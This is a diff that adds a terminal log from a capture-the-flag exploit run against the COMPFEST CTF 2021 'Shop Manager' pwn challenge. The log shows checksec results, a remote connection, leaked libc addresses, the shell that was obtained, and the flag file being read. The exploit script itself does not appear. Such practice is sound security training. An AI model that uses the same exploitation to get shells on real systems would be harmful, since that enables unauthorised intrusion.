@@ -1,0 +1,33 @@
+mito@ubuntu:~/CTF/COMPFEST_CTF_2021/Pwn_Shop_Manager/shop-manager-master-public/public$ python solve.py r
+[*] '/home/mito/CTF/COMPFEST_CTF_2021/Pwn_Shop_Manager/shop-manager-master-public/public/chall'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+[+] Opening connection to 103.152.242.242 on port 39221: Done
+[*] '/home/mito/CTF/COMPFEST_CTF_2021/Pwn_Shop_Manager/shop-manager-master-public/public/libc-2.27.so'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+libc_leak = 0x7ff49f953ca0
+libc_base = 0x7ff49f568000
+[*] Switching to interactive mode
+$ id
+/bin/sh: 1: id: not found
+$ ls -l
+total 2208
+drwxr-xr-x  2 0 0    4096 Sep 12 04:33 bin
+-r-xr-xr-x  1 0 0   17264 Sep 12 04:33 chall
+drwxr-xr-x  2 0 0    4096 Sep 12 04:33 dev
+-r--r--r--  1 0 0      56 Sep 12 04:33 flag.txt
+-rwxr-xr-x  1 0 0  179152 Sep 12 04:33 ld-2.27.so
+drwxr-xr-x 21 0 0    4096 Sep 12 04:33 lib
+drwxr-xr-x  3 0 0    4096 Sep 12 04:33 lib32
+drwxr-xr-x  2 0 0    4096 Sep 12 04:33 lib64
+-rwxr-xr-x  1 0 0 2030928 Sep 12 04:33 libc-2.27.so
+-rwxr-xr-x  1 0 0     339 Sep 12 04:33 run.sh
+$ cat flag.txt
+COMPFEST13{I_us3_st4Ck_p1v0T1ng_How_bouT_Y0u_dd4dfcc265}
